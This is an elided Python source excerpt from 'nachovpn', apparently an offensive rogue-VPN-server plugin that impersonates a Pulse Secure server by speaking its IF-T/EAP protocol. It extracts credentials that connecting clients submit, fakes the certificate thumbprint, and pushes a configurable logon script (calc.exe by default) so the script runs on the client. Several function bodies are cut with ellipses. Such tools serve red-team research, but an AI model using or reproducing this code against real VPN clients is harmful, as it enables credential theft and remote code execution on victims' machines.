...
from nachovpn.plugins.pulse.config_generator import (
    ESPConfigGenerator,
    VPNConfigGenerator,
)
...
class IFTPacket:
    ...
    def __str__(self):
        return (
            f"IF-T Packet: Vendor={hex(self.vendor_id)}, Message Type={self.message_type}, "
...
class EAPPacket:
    ...
    def __str__(self):
        return (
            f"EAP Packet: Vendor={hex(self.vendor)}, Code={self.code}, Identifier={hex(self.identifier)}, "
...
class AVP:
    ...
    def __str__(self):
        ...
        self.length = 8 + (4 if self.vendor is not None else 0) + len(self.value)
        return (
            f"AVP: Code={self.code}, Length={self.length}, "
...
class PulseSecurePlugin(VPNPlugin):
    def __init__(self, *args, **kwargs):
        ...
        self.logon_script = os.getenv(
            "PULSE_LOGON_SCRIPT", "C:\\Windows\\System32\\calc.exe"
        )
        self.logon_script_macos = os.getenv("PULSE_LOGON_SCRIPT_MACOS", "")
        self.dns_suffix = os.getenv("PULSE_DNS_SUFFIX", "nachovpn.local")
        self.anonymous_auth = (
            os.getenv("PULSE_ANONYMOUS_AUTH", "false").lower() == "true"
        )
        self.pulse_username = os.getenv("PULSE_USERNAME", "")
        self.pulse_save_connection = (
            os.getenv("PULSE_SAVE_CONNECTION", "false").lower() == "true"
        )
    ...
    def can_handle_http(self, handler):
        ...
        if (
            "odJPAService" in user_agent
            or "Secure%20Access" in user_agent
            or handler.path == "/pulse"
        ):
            return True
        return False
    ...
    def has_credentials(self, data):
        if (
            len(data) < 20
            or int.from_bytes(data[0:4], "big") != EXPANDED_JUNIPER
            or int.from_bytes(data[4:8], "big") != 1
        ):
            return False
    ...
    def auth_completed(self, data):
        ...
        return avp.code == 0xD6B and int.from_bytes(avp.value, "big") == 0x10
    ...
    def parse_eap_packet(self, data, client_socket):
        ...
        if (
            eap_in.code == EAP_RESPONSE
            and eap_in.identifier == 1
            and eap_in.eap_data[1:] == b"anonymous"
            and not self.anonymous_auth
        ):
            ...
            avp_list.append(
                AVP(
                    code=0xD49,
                    flags=AVP_VENDOR,
                    vendor=VENDOR_JUNIPER2,
                    value=(4).to_bytes(4, "big"),
                )
            )
            avp_list.append(
                AVP(
            ...
            eap = EAPPacket(
                vendor=JUNIPER_1,
                code=EAP_REQUEST,
                identifier=self.next_eap_identifier(),
                eap_data=eap_data,
            )
        ...
        # EAP Packet: Vendor=0xa4c01, Code=2, Identifier=0x2, Length=296, Data=fe000a4c0000000100000d4980000010000005830000000400000d61 ..
            ...
            eap_in.code == EAP_RESPONSE
            and self.is_client_info(eap_in.eap_data)
            and not self.anonymous_auth
        ):
        ...
        # EAP Packet: Vendor=0xa4c01, Code=2, Identifier=0x3, Length=56, Data=fe000a4c0000000100000d6d8000001000000583616161610000004f4000001a02000012fe000a4c000000020202056161610583
            ...
            eap_in.code == EAP_RESPONSE
            and self.has_credentials(eap_in.eap_data)
            or (self.anonymous_auth and eap_in.eap_data[1:] == b"anonymous")
        ):

            self.logger.info("Received credentials, sending back some cookies ..")

            if not self.anonymous_auth and not self.extract_credentials(
                eap_in.eap_data
            ):
            ...
            avp_list.append(
                AVP(
                    ...
                    flags=AVP_VENDOR,
                    vendor=VENDOR_JUNIPER2,
                    value=os.urandom(8).hex().encode(),
                )
            )  # ??
            avp_list.append(
                AVP(code=0xD8D, flags=AVP_VENDOR, vendor=VENDOR_JUNIPER2, value=b"")
            )  # ??
            avp_list.append(
                AVP(
                    code=0xD5C,
            ...
            avp_list.append(
                AVP(
                    ...
                    flags=AVP_VENDOR,
                    vendor=VENDOR_JUNIPER2,
                    value=self.get_thumbprint()["md5"].encode(),
                )
            )  # cert MD5
            avp_list.append(
                AVP(
        ...
        # EAP Packet: Vendor=0xa4c01, Code=2, Identifier=0x4, Length=28, Data=fe000a4c0000000100000d6b800000100000058300000010
            ...
            self.logger.info(
                "Auth completed, sending configuration and launching application..."
            )
            outbuf = b""
            ...
            reply = IFTPacket(
                vendor_id=VENDOR_TCG,
                message_type=IFT_CLIENT_AUTH_SUCCESS,
                message_identifier=0x01FA,
                message_value=eap.to_bytes(),
            )
            ...
            reply = IFTPacket(
                vendor_id=VENDOR_JUNIPER,
                message_type=0x8F,
                message_identifier=0x01FD,
                message_value=b"\x00\x00\x00\x00",
            )
            client_socket.sendall(reply.to_bytes())
            ...
            reply = IFTPacket(
                vendor_id=VENDOR_TCG,
                message_type=0x96,
                message_identifier=0x01FE,
                message_value=LICENSE_ID.encode(),
            )
            client_socket.sendall(reply.to_bytes())
        ...
        while data:
            ...
            if packet.message_type == IFT_VERSION_REQUEST:
                ...
                reply = IFTPacket(
                    ...
                    message_value=(2).to_bytes(4, "big"),
                )
                outbuf += reply.to_bytes()
